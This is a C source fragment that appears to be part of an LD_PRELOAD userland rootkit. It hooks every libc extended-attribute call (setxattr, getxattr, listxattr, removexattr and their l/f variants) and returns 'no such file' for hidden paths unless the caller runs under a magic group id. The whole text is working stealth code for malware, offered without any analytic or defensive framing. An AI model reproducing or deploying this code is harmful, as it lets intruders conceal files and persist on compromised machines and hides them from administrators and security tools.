int setxattr(const char *path, const char *name, const void *value, size_t size, int flags)
{
    HOOK(o_setxattr, "setxattr");
    if(getgid()==MGID) return o_setxattr(path, name, value, size, flags);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_setxattr(path, name, value, size, flags);
}

int lsetxattr(const char *path, const char *name, const void *value, size_t size, int flags)
{
    HOOK(o_lsetxattr, "lsetxattr");
    if(getgid()==MGID) return o_lsetxattr(path, name, value, size, flags);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_lsetxattr(path, name, value, size, flags);
}

int fsetxattr(int fd, const char *name, const void *value, size_t size, int flags)
{
    HOOK(o_fsetxattr, "fsetxattr");
    if(getgid()==MGID) return o_fsetxattr(fd, name, value, size, flags);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_fsetxattr(fd, name, value, size, flags);
}

ssize_t getxattr(const char *path, const char *name, void *value, size_t size)
{
    HOOK(o_getxattr, "getxattr");
    if(getgid()==MGID) return o_getxattr(path, name, value, size);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_getxattr(path, name, value, size);
}

ssize_t lgetxattr(const char *path, const char *name, void *value, size_t size)
{
    HOOK(o_lgetxattr, "lgetxattr");
    if(getgid()==MGID) return o_lgetxattr(path, name, value, size);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_lgetxattr(path, name, value, size);
}

ssize_t fgetxattr(int fd, const char *name, void *value, size_t size)
{
    HOOK(o_fgetxattr, "fgetxattr");
    if(getgid()==MGID) return o_fgetxattr(fd, name, value, size);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_fgetxattr(fd, name, value, size);
}

ssize_t listxattr(const char *path, char *list, size_t size)
{
    HOOK(o_listxattr, "listxattr");
    if(getgid()==MGID) return o_listxattr(path, list, size);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_listxattr(path, list, size);
}

ssize_t llistxattr(const char *path, char *list, size_t size)
{
    HOOK(o_llistxattr, "llistxattr");
    if(getgid()==MGID) return o_llistxattr(path, list, size);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_llistxattr(path, list, size);
}

ssize_t flistxattr(int fd, char *list, size_t size)
{
    HOOK(o_flistxattr, "flistxattr");
    if(getgid()==MGID) return o_flistxattr(fd, list, size);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_flistxattr(fd, list, size);
}

int removexattr(const char *path, const char *name)
{
    HOOK(o_removexattr, "removexattr");
    if(getgid()==MGID) return o_removexattr(path, name);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_removexattr(path, name);
}

int lremovexattr(const char *path, const char *name)
{
    HOOK(o_lremovexattr, "lremovexattr");
    if(getgid()==MGID) return o_lremovexattr(path, name);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_lremovexattr(path, name);
}

int fremovexattr(int fd, const char *name)
{
    HOOK(o_fremovexattr, "fremovexattr");
    if(getgid()==MGID) return o_fremovexattr(fd, name);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_fremovexattr(fd, name);
}
